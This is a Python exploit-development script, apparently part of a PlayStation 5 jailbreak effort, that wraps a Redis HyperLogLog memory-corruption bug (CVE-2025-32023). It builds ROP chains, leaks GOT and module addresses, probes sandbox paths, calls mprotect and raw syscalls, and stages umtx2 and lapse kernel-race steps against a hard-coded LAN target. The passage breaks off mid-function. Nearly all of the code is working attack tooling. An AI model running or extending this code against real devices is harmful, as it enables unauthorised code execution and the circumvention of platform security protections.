#!/usr/bin/env python3
"""
PS5 Redis 3.00 native ROP proof-of-concept wrapper.

This wraps the current CVE-2025-32023/HLL Redis primitive and demonstrates
the native-code control we have today:

  1. lowrop-send: build a ROP chain in Redis memory and call send(fd,...).
  2. got-leak: use ROP to read resolved Redis GOT entries and send them back.
  3. notify: use ROP-only open/write/close on /dev/notification0.

The underlying primitive is probabilistic, so this script supports retries and
restores hll-sparse-max-bytes after each attempt.
"""
import argparse
import json
import os
import random
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

import redis_hll_guarded_probe as hll


DEFAULT_HOST = "192.168.50.192"
DEFAULT_PORT = 1003
SEND_MAGIC = b"LOWROP_SEND_OK\n"
NOTIFY_MAGIC = b"NOTIFY_ROP_DONE\n"
SANDBOX_PROBE_MAGIC = b"SBOXP1!\x00"
SANDBOX_PROBE_HEADER_SIZE = 0x80
SANDBOX_PROBE_RECORD_SIZE = 0x80
AUTO_LAYOUT_FILLERS = [15, 0, 13, 14, 16, 12, 17, 10, 18, 20, 8, 22, 24, 30, 40, 60, 80]
GOT_LEAKS = [
    ("send", 0x126538),
    ("sceKernelDlsym", 0x1262C8),
    ("memcpy", 0x125F58),
]
REDIS_EBOOT_GETPID_GOT = 0x125FC8
REDIS_EBOOT_GETTIMEOFDAY_GOT = 0x126010
DLSYM_HANDLES = [0, 1, 2, 0x2001, 0x2002, -1]
DLSYM_SYMBOLS = ["YQOfxL4QfeU#I#A", "YQOfxL4QfeU"]
MODULE_DLSYM_NAMES = ["libkernel_sys.sprx", "libkernel.sprx", "libkernel_web.sprx", "libc.sprx"]
DEFAULT_SANDBOX_PROBE_PATHS = [
    "/",
    "/system",
    "/system_ex",
    "/system_ex/app",
    "/system_ex/app/NPXS40140/TA_AACS.sbin",
    "/dev",
    "/dev/notification0",
    "/dev/mp3",
    "/dev/encdec",
    "/dev/dmem0",
    "/data",
    "/mnt",
    "/mnt/usb0",
    "/preinst",
    "/system_tmp",
    "/sandbox",
    "/user",
    "/download0",
]
LIB_PAGE_SIZE = 0x4000
LIBC_MEMCPY_EXPORT = 0x3AD0
LIBC_GETPID_GOT = 0x1280C0
LIBC_GETTIMEOFDAY_GOT = 0x128198
LIBKERNEL_GETPID = 0x410
LIBKERNEL_GETTIMEOFDAY = 0x9D0
LIBKERNEL_SYS_GETPID = 0x500
LIBKERNEL_SYS_GETTIMEOFDAY = 0xBE0
LIBKERNEL_MODULE_TABLE_FIELDS = (0x10, 0x18, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70)
LIBKERNEL_CANDIDATES = [
    (
        "libkernel.prx",
        {
            "send": 0x12660,
            "sceKernelDlsym": 0x2FC60,
            "mprotect": 0x730,
            "getpid": LIBKERNEL_GETPID,
            "gettimeofday": LIBKERNEL_GETTIMEOFDAY,
        },
    ),
    (
        "libkernel_sys.prx",
        {
            "send": 0x13270,
            "sceKernelDlsym": 0x30870,
            "mprotect": 0x900,
            "getpid": LIBKERNEL_SYS_GETPID,
            "gettimeofday": LIBKERNEL_SYS_GETTIMEOFDAY,
        },
    ),
]


def restore_hll_config(host, port, value=3000, retries=12):
    last_exc = None
    for attempt in range(retries):
        try:
            with socket.create_connection((host, port), timeout=5) as sock:
                before = hll.redis_config_get(sock, "hll-sparse-max-bytes")
                hll.redis_config_set(sock, "hll-sparse-max-bytes", value)
                after = hll.redis_config_get(sock, "hll-sparse-max-bytes")
                print(f"[restore] hll-sparse-max-bytes {before} -> {after}")
                return True
        except Exception as exc:
            last_exc = exc
            time.sleep(1)
    print(f"[restore] failed: {last_exc}")
    return False


def run_tee(cmd, out_path, timeout):
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with out_path.open("wb") as outf:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=Path(__file__).resolve().parent,
        )
        start = time.time()
        assert proc.stdout is not None
        while True:
            if proc.poll() is not None:
                rest = proc.stdout.read()
                if rest:
                    sys.stdout.buffer.write(rest)
                    sys.stdout.buffer.flush()
                    outf.write(rest)
                break
            line = proc.stdout.readline()
            if line:
                sys.stdout.buffer.write(line)
                sys.stdout.buffer.flush()
                outf.write(line)
            if time.time() - start > timeout:
                proc.kill()
                raise TimeoutError(f"attempt timed out after {timeout}s")
        return proc.returncode


def parse_layout_fillers(value):
    text = str(value).strip().lower()
    if text == "auto":
        return AUTO_LAYOUT_FILLERS[:]
    if "," in text:
        out = []
        for part in text.split(","):
            part = part.strip()
            if part:
                out.append(int(part, 0))
        if not out:
            raise ValueError("empty --layout-fillers list")
        return out
    if ".." in text:
        first_s, last_s = text.split("..", 1)
        first = int(first_s, 0)
        last = int(last_s, 0)
        step = 1 if last >= first else -1
        return list(range(first, last + step, step))
    return [int(text, 0)]


def base_command(args, prefix, raw_out, layout_fillers):
    cmd = [
        sys.executable,
        "-u",
        "redis_hll_prespray_cclosure_read.py",
        "--fw", "300",
        "--host", args.host,
        "--port", str(args.port),
        "--prefix", prefix,
        "--layout-fillers", str(layout_fillers),
        "--preserve-cal-c-slot",
        "--closures", str(args.closures),
        "--eggs", str(args.eggs),
        "--scan-size", hex(args.scan_size),
        "--flag-search-span", hex(args.flag_search_span),
        "--bruteforce-reg-values",
        "--max-print", "2",
        "--dispatch-trigger",
        "--dispatch-spray-before-open",
        "--dispatch-mode", "c24f0",
        "--dispatch-target-offset", "0xDAB70",
        "--dispatch-followup-target-offset", "0x1CE08",
        "--dispatch-arg-eboot-offset", "0x14A000",
        "--dispatch-arg-sidecar-fd",
        "--dispatch-sidecar-after-calibration",
        "--lowrop-scratch-offset", "0x14A000",
        "--dispatch-raw-del-recv",
        "--dispatch-raw-del-out", str(raw_out),
        "--dispatch-raw-del-max", "0x100",
        "--dispatch-raw-del-timeout", str(args.raw_timeout),
    ]
    return cmd


def build_send_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-send",
        "--lowrop-msg", "LOWROP_SEND_OK",
    ]


def build_got_leak_command(args, prefix, raw_out, layout_fillers):
    cmd = base_command(args, prefix, raw_out, layout_fillers) + ["--stack-lowrop-got-leak"]
    for _name, off in GOT_LEAKS:
        cmd += ["--lowrop-leak-eboot-offset", hex(off)]
    return cmd


def build_notify_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-notify",
        "--stack-size", "0x1000",
        "--lowrop-copy-len", "0x1000",
        "--lowrop-msg-offset", "0xA00",
        "--lowrop-notify-offset", "0x1000",
        "--lowrop-notify-const-offset", "0x100",
        "--lowrop-notify-fd-slot-offset", "0x118",
        "--lowrop-notify-path-offset", "0x128",
        "--lowrop-notify-icon-offset", "0x150",
        "--lowrop-notify-text-offset", "0x180",
        "--lowrop-notify-text", args.notify_text,
        "--lowrop-notify-done-msg", "NOTIFY_ROP_DONE",
    ]


def sandbox_probe_paths(args):
    raw_paths = args.sandbox_path or DEFAULT_SANDBOX_PROBE_PATHS
    max_paths = max(1, min(args.sandbox_max_paths, 48))
    return [p for p in raw_paths if p][:max_paths]


def build_sandbox_probe_command(args, prefix, raw_out, layout_fillers):
    paths = sandbox_probe_paths(args)
    msg_len = SANDBOX_PROBE_HEADER_SIZE + len(paths) * SANDBOX_PROBE_RECORD_SIZE
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-sandbox-probe",
        "--stack-size", "0x6000",
        "--lowrop-copy-len", "0x6000",
        "--lowrop-msg-offset", "0x4000",
        "--dispatch-raw-del-max", hex(max(0x100, msg_len)),
        "--lowrop-sandbox-max-paths", hex(len(paths)),
        "--lowrop-sandbox-open-flags", hex(args.sandbox_open_flags),
    ]
    for path in paths:
        cmd += ["--lowrop-sandbox-path", path]
    return cmd


def parse_csv_or_default(value, default, convert=str):
    if value is None:
        return list(default)
    out = []
    for part in str(value).split(","):
        part = part.strip()
        if part:
            out.append(convert(part))
    if not out:
        raise ValueError("empty comma-separated list")
    return out


def dlsym_cases(args):
    handles = parse_csv_or_default(args.dlsym_handles, DLSYM_HANDLES, lambda x: int(x, 0))
    symbols = parse_csv_or_default(args.dlsym_symbols, DLSYM_SYMBOLS, str)
    return [(handle, symbol) for handle in handles for symbol in symbols]


def module_dlsym_cases(args):
    names = parse_csv_or_default(args.dlsym_module_names, MODULE_DLSYM_NAMES, str)
    symbols = parse_csv_or_default(args.dlsym_symbols, ["YQOfxL4QfeU#I#A"], str)
    return [(name, symbol) for name in names for symbol in symbols]


def self_dlsym_cases(args):
    symbols = parse_csv_or_default(args.dlsym_symbols, ["YQOfxL4QfeU#I#A"], str)
    return [(args.self_dlsym_flavor, symbol) for symbol in symbols]


def build_dlsym_probe_command(args, prefix, raw_out, layout_fillers):
    handles = parse_csv_or_default(args.dlsym_handles, DLSYM_HANDLES, lambda x: int(x, 0))
    symbols = parse_csv_or_default(args.dlsym_symbols, DLSYM_SYMBOLS, str)
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-dlsym-probe",
        "--stack-size", "0x2400",
        "--lowrop-copy-len", "0x2400",
        "--lowrop-msg-offset", "0x1200",
        "--lowrop-dlsym-symbol-offset", "0x1500",
        "--lowrop-dlsym-out-offset", "0x1800",
    ]
    for handle in handles:
        cmd += ["--lowrop-dlsym-handle", hex(handle & 0xFFFFFFFFFFFFFFFF)]
    for symbol in symbols:
        cmd += ["--lowrop-dlsym-symbol", symbol]
    return cmd


def build_module_dlsym_probe_command(args, prefix, raw_out, layout_fillers):
    names = parse_csv_or_default(args.dlsym_module_names, MODULE_DLSYM_NAMES, str)
    symbols = parse_csv_or_default(args.dlsym_symbols, ["YQOfxL4QfeU#I#A"], str)
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-module-dlsym-probe",
        "--stack-size", "0x2800",
        "--lowrop-copy-len", "0x2800",
        "--lowrop-msg-offset", "0x1400",
        "--lowrop-dlsym-symbol-offset", "0x1700",
        "--lowrop-dlsym-out-offset", "0x1C00",
        "--lowrop-module-dlsym-flavor", args.module_dlsym_flavor,
    ]
    for name in names:
        cmd += ["--lowrop-module-name", name]
    for symbol in symbols:
        cmd += ["--lowrop-dlsym-symbol", symbol]
    return cmd


def build_module_table_leak_command(args, prefix, raw_out, layout_fillers):
    entries = max(0, min(args.module_table_entries, 32))
    if entries <= 0:
        stack_size = 0x1800
        msg_offset = 0x1000
    elif entries <= 4:
        stack_size = 0x3000
        msg_offset = 0x2000
    else:
        stack_size = 0x4000
        msg_offset = 0x2800
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-module-table-leak",
        "--stack-size", hex(stack_size),
        "--lowrop-copy-len", hex(stack_size),
        "--lowrop-msg-offset", hex(msg_offset),
        "--dispatch-raw-del-max", "0x2000",
        "--lowrop-module-table-flavor", args.module_table_flavor,
        "--lowrop-module-table-entries", hex(entries),
    ]


def build_dynlib_list_command(args, prefix, raw_out, layout_fillers):
    header_len = 0x30 if args.dynlib_capture_errno else 0x20
    msg_len = (header_len + max(1, min(args.dynlib_list_max, 128)) * 4 + 7) & ~7
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-dynlib-list-probe",
        "--stack-size", "0x1800",
        "--lowrop-copy-len", "0x1800",
        "--lowrop-msg-offset", "0x1000",
        "--dispatch-raw-del-max", hex(max(0x100, msg_len)),
        "--lowrop-dynlib-flavor", args.dynlib_flavor,
        "--lowrop-dynlib-list-max", hex(args.dynlib_list_max),
        "--lowrop-dynlib-list-order", args.dynlib_list_order,
    ]
    if args.dynlib_capture_errno:
        cmd.append("--lowrop-dynlib-capture-errno")
    return cmd


def build_self_dlsym_probe_command(args, prefix, raw_out, layout_fillers):
    symbols = parse_csv_or_default(args.dlsym_symbols, ["YQOfxL4QfeU#I#A"], str)
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-self-dlsym-probe",
        "--stack-size", "0x2600",
        "--lowrop-copy-len", "0x2600",
        "--lowrop-msg-offset", "0x1300",
        "--lowrop-dlsym-symbol-offset", "0x1600",
        "--lowrop-dlsym-out-offset", "0x1A00",
        "--lowrop-self-dlsym-flavor", args.self_dlsym_flavor,
    ]
    for symbol in symbols:
        cmd += ["--lowrop-dlsym-symbol", symbol]
    return cmd


def build_self_info_leak_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-self-info-leak",
        "--stack-size", "0x1200",
        "--lowrop-copy-len", "0x1200",
        "--lowrop-msg-offset", "0x900",
        "--lowrop-self-dlsym-flavor", args.self_dlsym_flavor,
    ]


def build_mprotect_probe_command(args, prefix, raw_out, layout_fillers, derive_only=False):
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-mprotect-probe",
        "--stack-size", "0x1000",
        "--lowrop-copy-len", "0x1000",
        "--lowrop-msg-offset", "0x800",
        "--lowrop-mprotect-len", hex(args.mprotect_len),
        "--lowrop-mprotect-prot", hex(args.mprotect_prot),
        "--lowrop-mprotect-target", args.mprotect_target,
        "--lowrop-send-export-offset", hex(args.send_export_offset),
        "--lowrop-syscall-offset", hex(args.syscall_offset),
    ]
    if derive_only:
        cmd.append("--lowrop-mprotect-derive-only")
    return cmd


def build_indirect_send_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-indirect-send-probe",
        "--stack-size", "0x1000",
        "--lowrop-copy-len", "0x1000",
        "--lowrop-msg-offset", "0x800",
    ]


def build_libc_gettimeofday_command(args, prefix, raw_out, layout_fillers, derive_only=False):
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-libc-gettimeofday-probe",
        "--stack-size", "0x1000",
        "--lowrop-copy-len", "0x1000",
        "--lowrop-msg-offset", "0x800",
    ]
    if derive_only:
        cmd.append("--lowrop-libc-gettimeofday-derive-only")
    return cmd


def build_libc_getpid_command(args, prefix, raw_out, layout_fillers, derive_only=False):
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-libc-getpid-probe",
        "--stack-size", "0x1000",
        "--lowrop-copy-len", "0x1000",
        "--lowrop-msg-offset", "0x800",
    ]
    if derive_only:
        cmd.append("--lowrop-libc-getpid-derive-only")
    return cmd


def build_eboot_getpid_command(args, prefix, raw_out, layout_fillers, derive_only=False):
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-eboot-getpid-probe",
        "--stack-size", "0x1000",
        "--lowrop-copy-len", "0x1000",
        "--lowrop-msg-offset", "0x800",
    ]
    if derive_only:
        cmd.append("--lowrop-eboot-getpid-derive-only")
    return cmd


def build_eboot_gettimeofday_command(args, prefix, raw_out, layout_fillers, derive_only=False):
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-eboot-gettimeofday-probe",
        "--stack-size", "0x1000",
        "--lowrop-copy-len", "0x1000",
        "--lowrop-msg-offset", "0x800",
    ]
    if derive_only:
        cmd.append("--lowrop-eboot-gettimeofday-derive-only")
    return cmd


def build_eboot_mprotect_command(args, prefix, raw_out, layout_fillers, derive_only=False):
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-eboot-mprotect-probe",
        "--stack-size", "0x1000",
        "--lowrop-copy-len", "0x1000",
        "--lowrop-msg-offset", "0x800",
        "--lowrop-mprotect-len", hex(args.mprotect_len),
        "--lowrop-mprotect-prot", hex(args.mprotect_prot),
        "--lowrop-mprotect-target", args.mprotect_target,
        "--lowrop-eboot-mprotect-flavor", args.eboot_mprotect_flavor,
    ]
    if args.mprotect_capture_errno:
        cmd.append("--lowrop-mprotect-capture-errno")
    if args.mprotect_addr is not None:
        cmd += ["--lowrop-mprotect-addr", hex(args.mprotect_addr)]
    if derive_only:
        cmd.append("--lowrop-mprotect-derive-only")
    return cmd


def build_wrapper_call_command(args, prefix, raw_out, layout_fillers):
    min_msg_len = 0x50 if args.wrapper_capture_errno else 0x40
    if args.wrapper_use_setcontext:
        min_msg_len = max(min_msg_len, 0x600)
    msg_len = max(min_msg_len, min(args.wrapper_msg_len, 0x4000))
    stack_size = 0x1800 if msg_len <= 0x800 else 0x3000
    msg_offset = 0x1000 if stack_size == 0x1800 else 0x2000
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-wrapper-call-probe",
        "--stack-size", hex(stack_size),
        "--lowrop-copy-len", hex(stack_size),
        "--lowrop-msg-offset", hex(msg_offset),
        "--dispatch-raw-del-max", hex(max(0x100, msg_len)),
        "--lowrop-wrapper-flavor", args.wrapper_flavor,
        "--lowrop-wrapper-source", args.wrapper_source,
        "--lowrop-wrapper-offset", hex(args.wrapper_offset),
        "--lowrop-wrapper-msg-len", hex(msg_len),
    ]
    if args.wrapper_prezero_r8_r9:
        cmd.append("--lowrop-wrapper-prezero-r8-r9")
    if args.wrapper_capture_errno:
        cmd.append("--lowrop-wrapper-capture-errno")
    if args.wrapper_use_libc_call8:
        cmd.append("--lowrop-wrapper-use-libc-call8")
    if args.wrapper_call8_send_self:
        cmd.append("--lowrop-wrapper-call8-send-self")
    if args.wrapper_use_setcontext:
        cmd += [
            "--lowrop-wrapper-use-setcontext",
            "--lowrop-wrapper-setcontext-offset", hex(args.wrapper_setcontext_offset),
        ]
    if args.wrapper_no_save_context:
        cmd.append("--lowrop-wrapper-no-save-context")
    if args.wrapper_setcontext_ping_only:
        cmd.append("--lowrop-wrapper-setcontext-ping-only")
    if args.wrapper_setcontext_send_only:
        cmd.append("--lowrop-wrapper-setcontext-send-only")
    if args.wrapper_setcontext_call_rax:
        cmd.append("--lowrop-wrapper-setcontext-call-rax")
    if args.wrapper_setcontext_pivot_only:
        cmd.append("--lowrop-wrapper-setcontext-pivot-only")
    if args.wrapper_preflight_send:
        cmd.append("--lowrop-wrapper-preflight-send")
    for i in range(1, 7):
        value = getattr(args, f"wrapper_arg{i}")
        msg_off = getattr(args, f"wrapper_arg{i}_msg_offset")
        scratch_off = getattr(args, f"wrapper_arg{i}_scratch_offset")
        cmd += [f"--lowrop-wrapper-arg{i}", hex(value & 0xFFFFFFFFFFFFFFFF)]
        if msg_off is not None:
            cmd += [f"--lowrop-wrapper-arg{i}-msg-offset", hex(msg_off)]
        if scratch_off is not None:
            cmd += [f"--lowrop-wrapper-arg{i}-scratch-offset", hex(scratch_off)]
    return cmd


def build_direct_syscall_command(args, prefix, raw_out, layout_fillers):
    min_msg_len = 0x48 if args.direct_syscall_capture_errno else 0x40
    if args.direct_syscall_sixargs:
        min_msg_len = max(min_msg_len, 0x300)
    msg_len = max(min_msg_len, min(args.direct_syscall_msg_len, 0x4000))
    stack_size = 0x1800 if msg_len <= 0x800 else 0x3000
    msg_offset = 0x1000 if stack_size == 0x1800 else 0x2000
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-direct-syscall-probe",
        "--stack-size", hex(stack_size),
        "--lowrop-copy-len", hex(stack_size),
        "--lowrop-msg-offset", hex(msg_offset),
        "--dispatch-raw-del-max", hex(max(0x100, msg_len)),
        "--lowrop-direct-syscall-flavor", args.direct_syscall_flavor,
        "--lowrop-direct-syscall-source", args.direct_syscall_source,
        "--lowrop-direct-syscall-landing-adjust", hex(args.direct_syscall_landing_adjust),
        "--lowrop-direct-syscall-num", hex(args.direct_syscall_num),
        "--lowrop-direct-syscall-msg-len", hex(msg_len),
    ]
    if args.direct_syscall_wrapper_offset is not None:
        cmd += ["--lowrop-direct-syscall-wrapper-offset", hex(args.direct_syscall_wrapper_offset)]
    if args.direct_syscall_capture_errno:
        cmd.append("--lowrop-direct-syscall-capture-errno")
    if args.direct_syscall_sixargs:
        cmd.append("--lowrop-direct-syscall-sixargs")
    for i in range(1, 7):
        value = getattr(args, f"direct_syscall_arg{i}")
        msg_off = getattr(args, f"direct_syscall_arg{i}_msg_offset")
        scratch_off = getattr(args, f"direct_syscall_arg{i}_scratch_offset")
        stack_off = getattr(args, f"direct_syscall_arg{i}_stack_offset")
        stack_page_off = getattr(args, f"direct_syscall_arg{i}_stack_page_offset")
        cmd += [f"--lowrop-direct-syscall-arg{i}", hex(value & 0xFFFFFFFFFFFFFFFF)]
        if msg_off is not None:
            cmd += [f"--lowrop-direct-syscall-arg{i}-msg-offset", hex(msg_off)]
        if scratch_off is not None:
            cmd += [f"--lowrop-direct-syscall-arg{i}-scratch-offset", hex(scratch_off)]
        if stack_off is not None:
            cmd += [f"--lowrop-direct-syscall-arg{i}-stack-offset", hex(stack_off)]
        if stack_page_off is not None:
            cmd += [f"--lowrop-direct-syscall-arg{i}-stack-page-offset", hex(stack_page_off)]
    return cmd


def build_lapse_preflight_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-lapse-preflight",
        "--stack-size", "0x6000",
        "--lowrop-copy-len", "0x6000",
        "--lowrop-msg-offset", "0x3800",
        "--dispatch-raw-del-max", "0x1000",
    ]


def build_umtx2_preflight_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-umtx2-preflight",
        "--stack-size", "0x3000",
        "--lowrop-copy-len", "0x3000",
        "--lowrop-msg-offset", "0x2000",
        "--dispatch-raw-del-max", "0x1000",
    ]


def build_umtx2_wrapper_preflight_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-umtx2-wrapper-preflight",
        "--stack-size", "0x2600",
        "--lowrop-copy-len", "0x2600",
        "--lowrop-msg-offset", "0x1600",
        "--dispatch-raw-del-max", "0x1000",
    ]


def build_umtx2_race_one_command(args, prefix, raw_out, layout_fillers):
    inline_count = 0 if args.umtx2_preserve_lookup_fd else args.umtx2_inline_spray_count
    debug_wide_layout = args.umtx2_race_debug and inline_count <= 4
    if debug_wide_layout:
        stack_size = "0x7000"
        copy_len = "0x7000"
        msg_offset = "0x3800"
        raw_max = "0x6800"
    elif args.umtx2_worker_spray and inline_count <= 4:
        if args.umtx2_main_tag_worker_fds:
            stack_size = "0x7000"
            copy_len = "0x7000"
            msg_offset = "0x3400"
            raw_max = "0x7000"
        else:
            stack_size = "0x6000"
            copy_len = "0x6000"
            msg_offset = "0x2600"
            raw_max = "0x5800"
    elif inline_count <= 4:
        stack_size = "0x6000"
        copy_len = "0x6000"
        msg_offset = "0x2A00"
        raw_max = "0x5800"
    elif inline_count <= 8:
        stack_size = "0x7000"
        copy_len = "0x7000"
        msg_offset = "0x3800"
        raw_max = "0x6800"
    else:
        stack_size = "0xA000"
        copy_len = "0xA000"
        msg_offset = "0x5000"
        raw_max = "0x9800"
    cmd = base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-umtx2-race-one",
        "--stack-size", stack_size,
        "--lowrop-copy-len", copy_len,
        "--lowrop-msg-offset", msg_offset,
        "--dispatch-raw-del-max", raw_max,
        "--lowrop-umtx2-inline-spray-count", hex(inline_count),
        "--lowrop-umtx2-destroy-delay-target", args.umtx2_destroy_delay_target,
        "--lowrop-umtx2-destroy-delay-yields", hex(args.umtx2_destroy_delay_yields),
        "--lowrop-umtx2-destroy-pad-target", args.umtx2_destroy_pad_target,
        "--lowrop-umtx2-destroy-pad-count", hex(args.umtx2_destroy_pad_count),
        "--lowrop-umtx2-worker-spray-post-yields", hex(args.umtx2_worker_spray_post_yields),
    ]
    if args.umtx2_worker_spray:
        cmd.append("--lowrop-umtx2-worker-spray")
    if args.umtx2_worker_spray_gate:
        cmd.append("--lowrop-umtx2-worker-spray-gate")
    if args.umtx2_main_tag_worker_fds:
        cmd.append("--lowrop-umtx2-main-tag-worker-fds")
    if args.umtx2_preserve_lookup_fd:
        cmd.append("--lowrop-umtx2-preserve-lookup-fd")
    if args.umtx2_race_debug:
        cmd += ["--lowrop-umtx2-race-debug"]
    return cmd


def build_umtx2_spray_existing_command(args, prefix, raw_out, layout_fillers):
    if args.umtx2_spray_count <= 4:
        stack_size = "0x6000"
        copy_len = "0x6000"
        msg_offset = "0x3000"
    else:
        stack_size = "0x8000"
        copy_len = "0x8000"
        msg_offset = "0x5000"
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-umtx2-spray-existing",
        "--stack-size", stack_size,
        "--lowrop-copy-len", copy_len,
        "--lowrop-msg-offset", msg_offset,
        "--dispatch-raw-del-max", "0x6000",
        "--lowrop-umtx2-existing-fd", hex(args.umtx2_existing_fd),
        "--lowrop-umtx2-spray-count", hex(args.umtx2_spray_count),
    ]


def build_lapse_thread_command(args, prefix, raw_out, layout_fillers, start="longjmp"):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-lapse-thread-preflight",
        "--lowrop-lapse-thread-start", start,
        "--stack-size", "0x6000",
        "--lowrop-copy-len", "0x6000",
        "--lowrop-msg-offset", "0x3000",
        "--dispatch-raw-del-max", "0x1800",
    ]


def build_lapse_worker_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-lapse-worker-preflight",
        "--stack-size", "0x6000",
        "--lowrop-copy-len", "0x6000",
        "--lowrop-msg-offset", "0x3000",
        "--dispatch-raw-del-max", "0x2800",
    ]


def build_lapse_suspend_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-lapse-suspend-preflight",
        "--stack-size", "0x6000",
        "--lowrop-copy-len", "0x6000",
        "--lowrop-msg-offset", "0x3400",
        "--dispatch-raw-del-max", "0x2800",
    ]


def build_lapse_race_one_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-lapse-race-one",
        "--stack-size", "0x6000",
        "--lowrop-copy-len", "0x6000",
        "--lowrop-msg-offset", "0x2D00",
        "--dispatch-raw-del-max", "0x9000",
    ]


def build_lapse_race_copy_command(args, prefix, raw_out, layout_fillers):
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-lapse-race-one",
        "--stack-size", "0x8000",
        "--lowrop-copy-len", "0x8000",
        "--lowrop-msg-offset", "0x2D00",
        "--dispatch-raw-del-max", "0x9000",
    ]


def build_lapse_rthdr_command(args, prefix, raw_out, layout_fillers):
    stack_size = args.lapse_stack_size_override if args.lapse_stack_size_override is not None else 0x4000
    copy_len = args.lapse_copy_len_override if args.lapse_copy_len_override is not None else stack_size
    msg_offset = args.lapse_msg_offset_override if args.lapse_msg_offset_override is not None else 0x2000
    raw_max = args.lapse_raw_max_override if args.lapse_raw_max_override is not None else max(0x1000, copy_len)
    return base_command(args, prefix, raw_out, layout_fillers) + [
        "--stack-lowrop-lapse-rthdr-preflight",
        "--lowrop-lapse-rthdr-count", str(max(1, min(args.lapse_rthdr_count, 16))),
        "--lowrop-lapse-rthdr-set-loops", str(max(1, min(args.lapse_rthdr_set_loops, 64))),
        "--stack-size", f"0x{stack_size:X}",
        "--lowrop-copy-len", f"0x{copy_len:X}",
        "--lowrop-msg-offset", f"0x{msg_offset:X}",
        "--dispatch-raw-del-max", f"0x{raw_max:X}",
    ]


def build_lapse_race_rthdr_command(args, prefix, raw_out, layout_fillers):
    count = max(1, min(args.lapse_rthdr_count, 16))
    set_loops = max(1, min(args.lapse_rthdr_set_loops, 64))
    post_yields = max(0, min(args.lapse_post_resume_yields, 64))
    sleep_ns = max(0, min(args.lapse_post_resume_sleep_ns, 1_000_000_000))
    pre_sleep_ns = max(0, min(args.lapse_pre_suspend_sleep_ns, 1_000_000_000))
    pre_barrier_yields = max(0, min(getattr(args, "lapse_pre_barrier_yields", 0), 4))
    pre_barrier_sleep_ns = max(0, min(getattr(args, "lapse_pre_barrier_sleep_ns", 0), 1_000_000_000))
    pre_barrier_getpid_loops = max(
        0,
        min(
            getattr(args, "lapse_pre_barrier_getpid_loops", 0),
            max(0, 4 - pre_barrier_yields - (1 if pre_barrier_sleep_ns else 0)),
        ),
    )
    pre_barrier_rop_nops = max(0, min(getattr(args, "lapse_pre_barrier_rop_nops", 0), 2048))
    pre_suspend_rop_nops = max(0, min(getattr(args, "lapse_pre_suspend_rop_nops", 0), 1024))
    post_poll_rop_nops = max(0, min(getattr(args, "lapse_post_poll_rop_nops", 0), 1024))
    post_poll_yields = max(0, min(getattr(args, "lapse_post_poll_yields", 0), 8))
    post_resume_rop_nops = max(0, min(getattr(args, "lapse_post_resume_rop_nops", 0), 2048))
    client_fill_len = max(0, min(getattr(args, "lapse_client_fill_len", 0), 0x10000))
    sockbuf_size = max(0, min(getattr(args, "lapse_sockbuf_size", 0), 0x100000))
    conn_drain_len = max(0, min(getattr(args, "lapse_conn_drain_len", 0), 0x200))
    pre_suspend_getpid_loops = max(0, min(getattr(args, "lapse_pre_suspend_getpid_loops", 0), 16))
    pre_suspend_yields = max(
        0,
        min(
            getattr(
                args,
                "lapse_pre_suspend_yields",
                1 if getattr(args, "lapse_pre_suspend_yield", False) else 0,
            ),
            16,
        ),
    )
    worker_ack = bool(args.lapse_worker_ack)
    worker_ack_poll_ms = max(0, min(getattr(args, "lapse_worker_ack_poll_ms", 0), 1000))
    worker_ready_pipe = (
        bool(getattr(args, "lapse_worker_ready_pipe", False))
        and not worker_ack
        and worker_ack_poll_ms == 0
    )
    worker_ready_ack = (
        bool(getattr(args, "lapse_worker_ready_ack", False))
        and not worker_ack
        and worker_ack_poll_ms == 0
        and not worker_ready_pipe
    )
    worker_after_read_ack = (
        bool(getattr(args, "lapse_worker_after_read_ack", False))
        and not worker_ack
        and worker_ack_poll_ms == 0
        and not worker_ready_pipe
        and not worker_ready_ack
    )
